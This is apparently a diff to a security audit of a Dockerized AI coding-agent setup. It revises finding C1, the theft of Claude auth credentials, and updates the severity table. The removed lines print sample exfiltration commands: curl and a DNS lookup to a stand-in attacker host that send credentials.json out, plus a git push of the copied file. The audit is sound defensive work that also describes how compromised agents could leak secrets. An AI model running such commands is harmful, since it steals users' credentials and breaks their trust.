@@ -7,12 +7,16 @@ docker-entrypoint.sh, and the gateway sidecar implementation.
 
 ## Summary
 
-| Severity | Count | Fixed | Remaining |
-|----------|-------|-------|-----------|
-| Critical | 2 | 1 | 1 |
+| Severity | Count | Fixed/Reduced | Remaining |
+|----------|-------|---------------|-----------|
+| Critical | 2 | 2 | 0* |
 | High | 6 | 4 | 2 |
 | Medium | 15 | 1 | 14 |
-| **Total** | **23** | **6** | **17** |
+| **Total** | **23** | **7** | **16** |
+
+\* C1 (auth exfiltration) reduced to **Low** when using OAuth (Pro/Max) or
+AWS Bedrock — no static secrets to exfiltrate. Remains **High** if using
+static API keys.
 
 The containerized setup is **significantly safer than bare-metal** (agents can't
 read SSH keys, AWS creds, browser data). But it is not airtight against a
@@ -26,7 +30,7 @@ achieved code execution inside the container.
 
 ## Critical
 
-### C1. Claude Auth Token Exfiltration [REMAINING]
+### C1. Claude Auth Token Exfiltration [REDUCED — auth-method dependent]
 
 **Location:** `docker-compose.yml` volume mount
 
@@ -34,30 +38,32 @@ achieved code execution inside the container.
 - ~/.claude:/home/agent/.claude:ro
 ```
 
-**Problem:** Read-only prevents writes but agents can still *read* auth
-credentials and exfiltrate them:
+**Problem (original):** Read-only prevents writes but agents can still *read*
+auth credentials and exfiltrate them.
 
-```bash
-# HTTP exfiltration
-curl http://attacker.com/steal?token=$(cat ~/.claude/credentials.json)
+**Actual risk depends on your auth method:**
 
-# DNS exfiltration (bypasses HTTP firewalls)
-nslookup $(base64 ~/.claude/credentials.json).attacker.com
+| Auth Method | Static secrets in `~/.claude/`? | Risk |
+|---|---|---|
+| Google OAuth (Pro/Max) | No — browser-based, tokens managed by app runtime | **Low** |
+| AWS Bedrock | No — short-lived, auto-expire | **Low** |
+| API key (`ANTHROPIC_API_KEY`) | Yes — long-lived, plaintext | **High** |
 
-# Via rig repo
-cp ~/.claude/credentials.json /gt/rigs/repo/.oops && git push
-```
+**Google OAuth (Pro/Max):** Authentication is handled via browser-based OAuth
+flow. No static API keys or long-lived credentials are stored in `~/.claude/`.
+The config files contain settings and preferences, not secrets. Exfiltrating
+these files does not grant account access.
 
-**Impact:** Attacker gets your Claude Pro/Max subscription. Can masquerade as
-you, burn usage limits. If API keys are stored there, those are exposed too.
+**AWS Bedrock:** Credentials are short-lived and expire automatically. Bedrock
+creds are passed as environment variables — no host filesystem mounting needed.
 
-**Why it's hard to fix:** Claude Code requires the auth directory to function.
-The auth mechanism doesn't support scoped, short-lived container tokens.
+**API keys (if used):** The original threat applies in full. A static
+`ANTHROPIC_API_KEY` in config or env is a long-lived secret that can be
+exfiltrated via HTTP, DNS, or git push.
 
-**Mitigations (all partial):**
-- Rotate Claude auth regularly
-- Monitor subscription usage for anomalies
-- Restrict outbound network access (see M14)
+**Mitigations:**
+- Prefer OAuth or Bedrock over static API keys
+- If using API keys: rotate regularly, monitor usage, restrict outbound network (see M14)
 - Future: Anthropic could support machine-scoped tokens with expiry
 
 ---
